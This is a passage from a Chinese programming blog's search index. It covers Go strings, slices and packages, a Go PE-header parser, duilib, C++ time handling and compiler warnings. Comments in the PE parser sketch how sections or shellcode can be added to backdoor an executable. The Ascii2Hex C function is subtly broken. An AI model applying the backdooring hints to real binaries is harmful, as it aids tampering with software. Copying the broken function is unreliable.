然后通过以下方式运行，在这里一起显示了程序的输出： 12345678910$ go run string_t.go0 U+6B22 &#x27;欢&#x27; E6ACA2 33 U+8FCE &#x27;迎&#x27; E8BF8E 36 U+6765 &#x27;来&#x27; E69DA5 39 U+5230 &#x27;到&#x27; E588B0 312 U+5B9E &#x27;实&#x27; E5AE9E 315 U+9A8C &#x27;验&#x27; E9AA8C 318 U+697C &#x27;楼&#x27; E6A5BC 3length of t0: 12, t1: 9, t2: 21content of t2[0:2] is: E6AC 说明： 通过前面的课程我们知道通过 \\uhhhh 的方式我们可以通过创建 Unicode 字符。 在以上程序中，首先通过 :&#x3D; 符号创建了变量 t0，其值为 \\u6B22\\u8FCE\\u6765\\u5230，是 欢迎来到 中文字符的 unicode 编码，然后以同样的方式创建了变量 t1，其值为 实验楼，然后通过 + 操作符将 t0 和t1 拼接赋值给 t2。然后我们通过 range 操作符号对 unicode 字符串 t2 中的每一个 unicode 字符依次操作，我们这里只是简单的打印出每个字符在 t2 中的位置，每个字符的 unicode 码值，每个字符的字面量，每个字符的十六进制值，以及每个字符的字节长度。 这里我们使用 fmt 包种支持的格式指令，如果读者学习过 C 语言的话就一目了然。接着，我们通过 len 操作符计算出了每个字符串的字节长度。最后，我们使用切片访问了字符串 t2 的第 0-1 个字节，也就是前两个字节，其内容为 E6AC。前面我们说到不能使用切片的方式访问非 ASCII 字符串中的字符，原因在这里一目了然。字符 欢 其底层使用了三个字节表示，内容是 E6ACA2，如果只是简单的使用切片（只取切片中的一项）访问的是不能访问到整个字符的，因为字符的切片是通过字节数来索引的。","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言基础","slug":"B-Code/GO/Go简明手册/Go语言基础","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"字符串","slug":"B-Code/GO/Go简明手册/Go语言基础/字符串","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"Go基本语法——切片","date":"2023-10-27T01:24:02.127Z","path":"B_Code/GO/Go简明手册/Go语言基础/切片/切片/","text":"一般而言，Go 语言的切片比数组更加灵活，强大而且方便。数组是按值传递的（即是传递的副本），而切片是引用类型，传递切片的成本非常小，而且是不定长的。而且数组是定长的，而切片可以调整长度。创建切片的语法如下： make([ ]Type, length, capacity) make([ ]Type, length) [ ]Type&#123;&#125; [ ]Type&#123;value1, value2, ..., valueN&#125; 内置函数 make() 用于创建切片、映射和通道。当用于创建一个切片时，它会创建一个隐藏的初始化为零值的数组，然后返回一个引用该隐藏数组的切片。该隐藏的数组与 Go 语言中的所有数组一样，都是固定长度，如果使用第一种语法创建，那么其长度为切片的容量 capacity；如果是第二种语法，那么其长度记为切片的长度 length。一个切片的容量即为隐藏数组的长度，而其长度则为不超过该容量的任意值。另外可以通过内置的函数 append() 来增加切片的容量。切片可以支持以下操作： 我们练习下，创建源文件 slice_array.go，输入以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( &quot;fmt&quot;)func main() &#123; a := [...]int&#123;1, 2, 3, 4, 5, 6, 7&#125; fmt.Printf(&quot;len and cap of array %v is: %d and %d\\n&quot;, a, len(a), cap(a)) fmt.Printf(&quot;item in array: %v is:&quot;, a) for _, value := range a &#123; fmt.Printf(&quot;% d&quot;, value) &#125; fmt.Println() s1 := a[3:6] fmt.Printf(&quot;len and cap of slice: %v is: %d and %d\\n&quot;, s1, len(s1), cap(s1)) fmt.Printf(&quot;item in slice: %v is:&quot;, s1) for _, value := range s1 &#123; fmt.Printf(&quot;%d&quot;, value) &#125; fmt.Println() s1[0] = 456 fmt.Printf(&quot;item in array changed after changing slice: %v is:&quot;, s1) for _, value := range a &#123; fmt.Printf(&quot;%d&quot;, value) &#125; fmt.Println() s2 := make([]int, 10, 20) s2[4] = 5 fmt.Printf(&quot;len and cap of slice: %v is: %d and %d\\n&quot;, s2, len(s2), cap(s2)) fmt.Printf(&quot;item in slice %v is:&quot;, s2) for _, value := range s2 &#123; fmt.Printf(&quot;%d&quot;, value) &#125; fmt.Println()&#125; 以上代码中，我们首先创建了一个数组，数组的长度是由 Go 语言自动计算出的（省略号语法），然后通过切片操作从数组 a 中创建了切片 s1，接着我们修改了该切片的第一个位置的数值，然后发现数组 a 中的值也发生了变化。最后我们通过 make() 函数创建了一个切片，该切片的长度和容量分别为 10 和 20，还可以发现 Go 语言将未初始化的项自动赋予零值。运行代码输出如下： 12345678$ go run slice_array.golen and cap of array [1 2 3 4 5 6 7] is: 7 and 7item in array: [1 2 3 4 5 6 7] is: 1 2 3 4 5 6 7len and cap of slice: [4 5 6] is: 3 and 4item in slice: [4 5 6] is: 4 5 6item in array changed after changing slice: [456 5 6] is: 1 2 3 456 5 6 7len and cap of slice: [0 0 0 0 5 0 0 0 0 0] is: 10 and 20item in slice [0 0 0 0 5 0 0 0 0 0] is: 0 0 0 0 5 0 0 0 0 0","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言基础","slug":"B-Code/GO/Go简明手册/Go语言基础","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"切片","slug":"B-Code/GO/Go简明手册/Go语言基础/切片","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%88%87%E7%89%87/"}]},{"title":"Go简明手册——Go创建并使用本地宝","date":"2023-10-27T01:24:02.119Z","path":"B_Code/GO/Go简明手册/Go语言基础/package/README/","text":"[toc] 包 包是各种类型和函数的集合。在包中，如果标示符（类型名称，函数名称，方法名称）的首字母是大写，那这些标示符是可以被导出的，也就是说可以在包以外直接使用。 $GOPATH ：环境变量（指向一个或多个目录），以及其子目录 src 目录的，当我们使用 import 关键字导入包的时候，Go 语言会在 $GOPATH 和 GOROOT 目录中搜索包。 创建并使用自定义包 源文件注意点： go文件名和文件夹名并没有关系，文件名可以是任意的，文件定义的package 才是标识 方法定义一定得是首字母大写 自定义包不能和导入处于同级目录，必须建一个文件夹存放自定义包 先看一下目录结构，以下示例是导入两包，一个是add，一个是simpleinterest 123456789│ go.mod│ main.go│ README.md│├─add│ add.go│└─simpleinterest simpleinterest.go 步骤说明1 创建package文件夹123mkdir packagego mod init packagetest 执行上述命令后，会生成 go.mod 文件，内容如下所示 123module packageTestgo 1.20 2 创建各个文件main.go123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;packageTest/add&quot; //导入 add 包 这个包必须放在$GOPATH下才可 &quot;packageTest/simpleinterest&quot;)var p, r, t = 5000.0, 10.0, 1.0/** init function to check if p, r and t are greater than zero */func init() &#123; println(&quot;Main package initialized&quot;) if p &lt; 0 &#123; log.Fatal(&quot;Principal is less than zero&quot;) &#125; if r &lt; 0 &#123; log.Fatal(&quot;Rate of interest is less than zero&quot;) &#125; if t &lt; 0 &#123; log.Fatal(&quot;Duration is less than zero&quot;) &#125;&#125;func main() &#123; c := add.Add(1, 2) //调用 add 包中的 add 函数 si := simpleinterest.Calculate(p, r, t) // 调用 simpleinterest 包的 Calculate 函数 fmt.Println(c) fmt.Println(&quot;Simple interest is&quot;, si)&#125; simpleinterest&#x2F;simpleinterest.go1234567891011121314151617package simpleinterestimport &quot;fmt&quot;/* * init function added */func init() &#123; fmt.Println(&quot;Simple interest package initialized&quot;)&#125;//Calculate calculates and returns the simple interest for principal p, rate of interest r for time duration t yearsfunc Calculate(p float64, r float64, t float64) float64 &#123; interest := p * (r / 100) * t return interest&#125; add&#x2F;add.go12345package addfunc Add(a int, b int) (num int) &#123; return a + b&#125; 3 执行并调试输出如下所示 1234Main package initializedSimple interest package initialized3Simple interest is 500","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"package","slug":"package","permalink":"http://example.com/tags/package/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go语言基础","slug":"B-Code/GO/Go简明手册/Go语言基础","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"package","slug":"B-Code/GO/Go简明手册/Go语言基础/package","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/package/"}]},{"title":"Go开发经验(1)","date":"2023-10-27T01:24:02.116Z","path":"B_Code/GO/Go开发经验/Go开发经验(1)/","text":"[toc] 1 var 与 := 的区别:= 只能在声明“局部变量”的时候使用，而“var”没有这个限制。","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go开发经验","slug":"B-Code/GO/Go开发经验","permalink":"http://example.com/categories/B-Code/GO/Go%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C/"}]},{"title":"GO HACK PE文件分析","date":"2023-10-27T01:24:02.114Z","path":"B_Code/GO/GO_HACK_PEFILES/","text":"使用 go 对 PE文件进行分析 使用debug&#x2F;pe标准库进行解析 使用Reader对象对PE文件内容进行解析 PE文件结构 DOSheader 包含签名（0x5a4d）peheader(0x3c指向0x50 0x45 0x00 0x00) dos stub coff file header optional header section table 12345678910// pe头type FileHeader struct &#123; Machine uint16 NumberOfSections uint16 // 分区数 TimeDateStamp uint32 PointerToSymbolTable uint32 NumberOfSymbols uint32 SizeOfOptionalHeader uint16 Characteristics uint16&#125; 如果需要增加新分区，插入后门代码，需要修改这里的分区数属性 增加新的Sections 或者在imagebase中增加shellcode 作者：mafa1993链接：https://www.jianshu.com/p/2294fcfc0286来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145package mainimport ( &quot;debug/pe&quot; &quot;encoding/binary&quot; &quot;fmt&quot; &quot;io&quot; &quot;log&quot; &quot;os&quot;)func main() &#123; f, err := os.Open(&quot;G:\\\\Windows\\\\WinSxS\\\\amd64_microsoft-windows-calc_31bf3856ad364e35_10.0.18362.1_none_7c1b713697f466dd\\\\calc.exe&quot;) // Modify for binary or change to accept args check(err) pefile, err := pe.NewFile(f) // 创建pe文件对象 check(err) defer f.Close() defer pefile.Close() dosHeader := make([]byte, 96) // 读取前96个字节 sizeOffset := make([]byte, 4) // Dec to Ascii (searching for MZ) _, err = f.Read(dosHeader) check(err) fmt.Println(&quot;[-----DOS Header / Stub----- header和stub解析]&quot;) fmt.Printf(&quot;[+] Magic Value: %s%s\\n&quot;, string(dosHeader[0]), string(dosHeader[1])) // Validate PE+0+0 (Valid PE format) pe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:])) // 从0x3c后开始读取 f.ReadAt(sizeOffset, pe_sig_offset) // sizeoffset为buffer，pe_sig_offset是读取的位置 这里不加:可以吗？？ 读取0x50 0x45 0x00 0x00 fmt.Println(&quot;[-----Signature Header-----]&quot;) fmt.Printf(&quot;[+] LFANEW Value: %s\\n&quot;, string(sizeOffset)) // Create the reader and read COFF Header sr := io.NewSectionReader(f, 0, 1&lt;&lt;63-1) // 读取到2^64次方-1 _, err = sr.Seek(pe_sig_offset+4, os.SEEK_SET) // 重置指针 check(err) binary.Read(sr, binary.LittleEndian, &amp;pefile.FileHeader) // 二进制读取 // Get size of OptionalHeader // 可选头解析 向加载程序提供重要数据，加载程序将可执行文件加载到虚拟内存 var sizeofOptionalHeader32 = uint16(binary.Size(pe.OptionalHeader32&#123;&#125;)) var sizeofOptionalHeader64 = uint16(binary.Size(pe.OptionalHeader64&#123;&#125;)) var oh32 pe.OptionalHeader32 var oh64 pe.OptionalHeader64 // type FileHeader struct &#123; // Machine uint16 // NumberOfSections uint16 // TimeDateStamp uint32 // PointerToSymbolTable uint32 // NumberOfSymbols uint32 // SizeOfOptionalHeader uint16 // Characteristics uint16 // &#125; // Read OptionalHeader switch pefile.FileHeader.SizeOfOptionalHeader &#123; case sizeofOptionalHeader32: binary.Read(sr, binary.LittleEndian, &amp;oh32) case sizeofOptionalHeader64: binary.Read(sr, binary.LittleEndian, &amp;oh64) &#125; // Print File Header fmt.Println(&quot;[-----COFF File Header-----]&quot;) fmt.Printf(&quot;[+] Machine Architecture: %#x\\n&quot;, pefile.FileHeader.Machine) fmt.Printf(&quot;[+] Number of Sections: %#x\\n&quot;, pefile.FileHeader.NumberOfSections) fmt.Printf(&quot;[+] Size of Optional Header: %#x\\n&quot;, pefile.FileHeader.SizeOfOptionalHeader) // Print section names fmt.Println(&quot;[-----Section Offsets-----]&quot;) fmt.Printf(&quot;[+] Number of Sections Field Offset: %#x\\n&quot;, pe_sig_offset+6) // this is the end of the Signature header (0x7c) + coff (20bytes) + oh32 (224bytes) fmt.Printf(&quot;[+] Section Table Offset: %#x\\n&quot;, pe_sig_offset+0xF8) // Print Optional Header fmt.Println(&quot;[-----Optional Header-----]&quot;) // 如果对pe文件加入后门，需要对下面两项有所了解 fmt.Printf(&quot;[+] Entry Point: %#x\\n&quot;, oh32.AddressOfEntryPoint) // 相对于imageBase的可执行代码位置 fmt.Printf(&quot;[+] ImageBase: %#x\\n&quot;, oh32.ImageBase) // 将图像加载到内存时第一个字节位置 fmt.Printf(&quot;[+] Size of Image: %#x\\n&quot;, oh32.SizeOfImage) // 图像的实际大小 fmt.Printf(&quot;[+] Sections Alignment: %#x\\n&quot;, oh32.SectionAlignment) fmt.Printf(&quot;[+] File Alignment: %#x\\n&quot;, oh32.FileAlignment) fmt.Printf(&quot;[+] Characteristics: %#x\\n&quot;, pefile.FileHeader.Characteristics) fmt.Printf(&quot;[+] Size of Headers: %#x\\n&quot;, oh32.SizeOfHeaders) fmt.Printf(&quot;[+] Checksum: %#x\\n&quot;, oh32.CheckSum) fmt.Printf(&quot;[+] Machine: %#x\\n&quot;, pefile.FileHeader.Machine) fmt.Printf(&quot;[+] Subsystem: %#x\\n&quot;, oh32.Subsystem) fmt.Printf(&quot;[+] DLLCharacteristics: %#x\\n&quot;, oh32.DllCharacteristics) // Print Data Directory fmt.Println(&quot;[-----Data Directory----- 数据目录解析，可选头的最后128字节]&quot;) var winnt_datadirs = []string&#123; &quot;IMAGE_DIRECTORY_ENTRY_EXPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_IMPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_RESOURCE&quot;, &quot;IMAGE_DIRECTORY_ENTRY_EXCEPTION&quot;, &quot;IMAGE_DIRECTORY_ENTRY_SECURITY&quot;, &quot;IMAGE_DIRECTORY_ENTRY_BASERELOC&quot;, &quot;IMAGE_DIRECTORY_ENTRY_DEBUG&quot;, &quot;IMAGE_DIRECTORY_ENTRY_COPYRIGHT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_GLOBALPTR&quot;, &quot;IMAGE_DIRECTORY_ENTRY_TLS&quot;, &quot;IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG&quot;, &quot;IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_IAT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR&quot;, &quot;IMAGE_NUMBEROF_DIRECTORY_ENTRIES&quot;, &#125; for idx, directory := range oh32.DataDirectory &#123; fmt.Printf(&quot;[!] Data Directory: %s\\n&quot;, winnt_datadirs[idx]) fmt.Printf(&quot;[+] Image Virtual Address: %#x\\n&quot;, directory.VirtualAddress) fmt.Printf(&quot;[+] Image Size: %#x\\n&quot;, directory.Size) &#125; fmt.Println(&quot;[-----Section Table----- 解析分区表]&quot;) // 包含了相关分区的详细信息，与coff file header中numberofsections 匹配 for _, section := range pefile.Sections &#123; fmt.Println(&quot;[+] --------------------&quot;) fmt.Printf(&quot;[+] Section Name: %s\\n&quot;, section.Name) fmt.Printf(&quot;[+] Section Characteristics: %#x\\n&quot;, section.Characteristics) fmt.Printf(&quot;[+] Section Virtual Size: %#x\\n&quot;, section.VirtualSize) fmt.Printf(&quot;[+] Section Virtual Offset: %#x\\n&quot;, section.VirtualAddress) fmt.Printf(&quot;[+] Section Raw Size: %#x\\n&quot;, section.Size) fmt.Printf(&quot;[+] Section Raw Offset to Data: %#x\\n&quot;, section.Offset) fmt.Printf(&quot;[+] Section Append Offset (Next Section): %#x\\n&quot;, section.Offset+section.Size) &#125; // s := pefile.Section(&quot;.text&quot;) // fmt.Printf(&quot;%v&quot;, *s) // &quot;Section Table Offset&quot; + (40bytes * number of sections)&#125;func check(e error) &#123; if e != nil &#123; log.Fatal(e) &#125;&#125;","tags":[{"name":"Go","slug":"Go","permalink":"http://example.com/tags/Go/"},{"name":"PE文件","slug":"PE文件","permalink":"http://example.com/tags/PE%E6%96%87%E4%BB%B6/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"}]},{"title":"duilib 入门","date":"2023-10-27T01:24:02.113Z","path":"B_Code/Duilib/入门/","text":"[toc] 开卷有益🎈github： duilib&#x2F;duilib 📖说明：Duilib是一个Windows下免费开源的DirectUI界面库，由于简约易扩展的设计以及稳定高效的实现被各大互联网公司普遍接受，广泛应用于包括IM、视频客户端、股票行情软件、导航软件、手机辅助软件、安全软件等多个行业的众多PC客户端软件。Duilib还在不断的发展中，在文档、例子、动画、渲染引擎等多个方面将持续改进。 基于Duilib的软件不完全列表Duilib自2010年8月21日发布以来，获得了众多开发者和大公司的信赖，在各行各业的软件中得到了广泛应用，以下是一个作者知道不完全列表，欢迎大家补充指正 https://github.com/duilib/duilib/wiki/%E5%9F%BA%E4%BA%8EDuilib%E7%9A%84%E8%BD%AF%E4%BB%B6%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%88%97%E8%A1%A8 下面两个修改版本大家可以参考一下 腾讯使用的的duilib修改版https://github.com/tencentyun/TIMSDK/tree/master/cross-platform/Windows/IMApp/Basic/duilib 网易使用的duilib修改版https://github.com/netease-im/NIM_Duilib_Framework/tree/master/duilib 安装使用vcpkg库管理器下载并安装duilib: 12345git clone https://github.com/Microsoft/vcpkg.gitcd vcpkg./bootstrap-vcpkg.sh./vcpkg integrate install./vcpkg install duilib","tags":[{"name":"duilib","slug":"duilib","permalink":"http://example.com/tags/duilib/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Duilib","slug":"B-Code/Duilib","permalink":"http://example.com/categories/B-Code/Duilib/"}]},{"title":"锁","date":"2023-10-27T01:24:02.112Z","path":"B_Code/CPP/锁/","text":"1std::unique_lock&lt;std::recursive_mutex&gt; lock(sensor_handle_mutex); 1","tags":[{"name":"cpp","slug":"cpp","permalink":"http://example.com/tags/cpp/"},{"name":"mutex","slug":"mutex","permalink":"http://example.com/tags/mutex/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"⏰ 时间处理","date":"2023-10-27T01:24:02.111Z","path":"B_Code/CPP/时间处理/","text":"Simple Demo1234567891011#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;int main()&#123; time_t t; time(&amp;t); cout &lt;&lt; t &lt;&lt;endl; return 0;&#125; 以上代码会输出一个10位数，表示的是到当前时间的秒数，起点是 1970年1月1日 00:00:00 time_t 转换 string 转 time_t 12345678910111213141516time_t StringToDatetime(std::string str)&#123; char *cha = (char*)str.data(); // 将string转换成char*。 tm tm_; // 定义tm结构体。 int year, month, day, hour, minute, second;// 定义时间的各个int临时变量。 sscanf(cha, &quot;%d-%d-%d %d:%d:%d&quot;, &amp;year, &amp;month, &amp;day, &amp;hour, &amp;minute, &amp;second);// 将string存储的日期时间，转换为int临时变量。 tm_.tm_year = year - 1900; // 年，由于tm结构体存储的是从1900年开始的时间，所以tm_year为int临时变量减去1900。 tm_.tm_mon = month - 1; // 月，由于tm结构体的月份存储范围为0-11，所以tm_mon为int临时变量减去1。 tm_.tm_mday = day; // 日。 tm_.tm_hour = hour; // 时。 tm_.tm_min = minute; // 分。 tm_.tm_sec = second; // 秒。 tm_.tm_isdst = 0; // 非夏令时。 time_t t_ = mktime(&amp;tm_); // 将tm结构体转换成time_t格式。 return t_; // 返回值。&#125; time_t 转 string 123456789101112131415(1) time_t t=std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()); std::stringstream ss; ss&lt;&lt;std::put_time(std::localtime(&amp;t),&quot;%F %X&quot;); ss.str();(2) size_t strftime (char* ptr, size_t maxsize, const char* format, const struct tm* timeptr ); ptr:存储转换结果 maxsize:复制到ptr的最大字符数，包括结束符&#x27;\\0&#x27; format:转换格式，类似printf，可加入其他需要复制过去的字符 timeptr:时间 char buf[20]; tm* local_time = std::localtime(&amp;t); strftime(buf,sizeof(buf),&quot;%F %X&quot;,local_time); C++时间类使用C++时间类处理获取系统当前时间 日期和时间工具 - C++中文 - API参考文档 (apiref.com) 头文件 #include &lt;chrono&gt; 获取当前时间 1system_clock::time_point now = std::chrono::system_clock::now(); 将当前时间转换为time_格式 1time_t tt = std::chrono::system_clock::to_time_t(now); 将time_格式的时间转换为tm *格式 1struct tm* tmNow = localtime(&amp;tt); 将tm*格式的时间转换为可读的时间 12char date[20] = &#123; 0 &#125;;sprintf(date, &quot;%d-%02d-%02d %02d:%02d:%02d&quot;,(int)tmNow-&gt;tm_year + 1900, (int)tmNow-&gt;tm_mon + 1, (int)tmNow-&gt;tm_mday, (int)tmNow-&gt;tm_hour, (int)tmNow-&gt;tm_min, (int)tmNow-&gt;tm_sec); 最后，在C++中的话可以将char*字符串转换为std::string字符串来处理 1std::string timeNow(date);","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"时间","slug":"时间","permalink":"http://example.com/tags/%E6%97%B6%E9%97%B4/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"visual studio 编译告警常见处理手段","date":"2023-10-27T01:24:02.111Z","path":"B_Code/CPP/编译告警常见处理手段/","text":"[TOC] C2001 常量中有换行符 文件保存为 UTF-8 签名 C4100 “*” 类型未使用 windows 代码文件中使用 1UNREFERENCED_PARAMETER(X) 如果是在Qt中，则可以使用 1Q_UNUSED(X); 另外，也不建议使用上述两种方式。当实现接口或标准导出内的方法时，有一些参数没有被引用是相当常见的。编译器会发现未 使用的参数，并产生一个警告，有些组件甚至会认为这是一个错误。为避免发生如此情况， 将未使用的参数使用&#x2F;* 参数名 *&#x2F; 语法将其注释掉。不要使用 UNREFERENCED_PARAMETER（） 宏，因为其 1）太繁琐，2）并不能保证参数实际上真的未被引用。 最好的方法就是在函数接口中注释掉未使用的变量。 1LRESULT WndProc（HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM /* lParam */） C4805 操作类型混合不安全：一般在操作 bool 和 int 时会触发这一警告 简单处理就是不要使用这种作为判断的依据，要么用 bool 类型，要么用 int 类型。 也可以使用强制转换。 C4996GetVersionExA 被声明为已否决碰见这种情况，需要关闭项目的SDL检查。 1Project Properties &gt; Configuration Properties &gt; C/C++ &gt; General &gt; SDL checks关掉 其他 ‘qsort’：Use std::sort C5208出现这个问题的原因是 C 风格代码和 C++ 风格代码混用导致的，结构体在 C 和 C++ 中是不一样的： C 1234typedef struct&#123; char *yyy=new zzz[ttt];&#125;xxx; CPP 1234struct xxx &#123; char *yyy=new zzz[ttt];&#125;; 具体原因是：最新的C++20标准中，为了更好的实现模块module的特性，typedef 一个未命名的struct被限制为只能使用纯粹的c语言语法，它不能通过赋值进行类内初始化了。 所以修改的方案就是不要声明匿名结构体，在声明时创建结构体名。 C6387 警告内容：“***”可能是0，这不符合函数“****”的规范。 这个问题就是函数参数没有做校验，也就是判空等情况，如下所示代码就会出现该警告： 123456789101112131415m_hMutex = CreateMutex(NULL, TRUE, this-&gt;MutexName);if (GetLastError() == ERROR_ALREADY_EXISTS)&#123; if (WaitForSingleObject(m_hMutex, INFINITE) == WAIT_OBJECT_0) &#123; Unlock(m_hMutex); return FALSE; &#125; else &#123; g_hMutex = m_hMutex; MutexReleased = FALSE; return TRUE; &#125;&#125; 修改为如下所示： 123456789101112131415161718m_hMutex = CreateMutex(NULL, TRUE, this-&gt;MutexName);if (GetLastError() == ERROR_ALREADY_EXISTS)&#123; if (m_hMutex != NULL) // 添加判空逻辑 &#123; if (WaitForSingleObject(m_hMutex, INFINITE) == WAIT_OBJECT_0) &#123; Unlock(m_hMutex); return FALSE; &#125; else &#123; g_hMutex = m_hMutex; MutexReleased = FALSE; return TRUE; &#125; &#125;&#125; LNK4098 LINK : warning LNK4098: 默认库“LIBCMT”与其他库的使用冲突；请使用 &#x2F;NODEFAULTLIB:library 简单处理就是在VS项目属性 -&gt; 链接器 -&gt; 命令行 中添加上述提示的内容。以 LIBCMT 库为例：添加内容如下所示： 1/NODEFAULTLIB:LIBCMT LNK4099 warning LNK4099: 未找到 PDB“cryptlib.pdb”(使用“cryptlib.lib(cryptlib.obj) 一般这种情况属于使用了开源库编译的lib，在项目中使用时，调试信息格式选择了 /zi 选项。因此会提示没有 obj 文件。 解决办法就是程序调试信息选择无即可。另外就是我们编译过程中如果需要调试信息格式，也就是pdb该怎么同时处理这两个问题：","tags":[{"name":"CPP","slug":"CPP","permalink":"http://example.com/tags/CPP/"},{"name":"visual studio","slug":"visual-studio","permalink":"http://example.com/tags/visual-studio/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"文件后缀校验","date":"2023-10-27T01:24:02.110Z","path":"B_Code/CPP/文件后缀校验/","text":"123456789101112#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123; std::string fn = &quot;filename.conf&quot;; if(fn.substr(fn.find_last_of(&quot;.&quot;) + 1) == &quot;conf&quot;) &#123; std::cout &lt;&lt; &quot;Yes...&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No...&quot; &lt;&lt; std::endl; &#125;&#125;","tags":[{"name":"cpp","slug":"cpp","permalink":"http://example.com/tags/cpp/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"各种宏定义用法整理","date":"2023-10-27T01:24:02.109Z","path":"B_Code/CPP/宏定义/","text":"C语言ASCII字符、16进制和BCD码值互转，各种好用的宏定义取值1、把Ascii字符转16进制 1234567891011121314151617181920212223/***************************函数名:Ascii2Hex功能描述:把Ascii字符转16进制参数：Ascii字符返回：16进制***************************/unsigned char Ascii2Hex( unsigned char bAscii ) &#123; unsigned char bHex = 0; if( ( bAscii &gt;= 0 ) &amp;&amp; ( bChar &lt;= 9 ) ) &#123; bHex = bAscii + 0x30; &#125; else if( ( bAscii &gt;= 10 ) &amp;&amp; ( bAscii &lt;= 15 ) ) &#123; bHex = bAscii + 0x37; &#125; else &#123; bHex = 0xff; &#125; return bHex;&#125; 2、把16进制转Ascii字符 123456789101112131415161718192021222324252627/***************************函数名:Hex2Ascii功能描述:把16进制转Ascii字符参数：16进制返回：Ascii字符***************************/unsigned char Hex2Ascii( unsigned char bHex ) &#123; unsigned char bAscii = 0; if( ( bHex &gt;= &#x27;0&#x27; ) 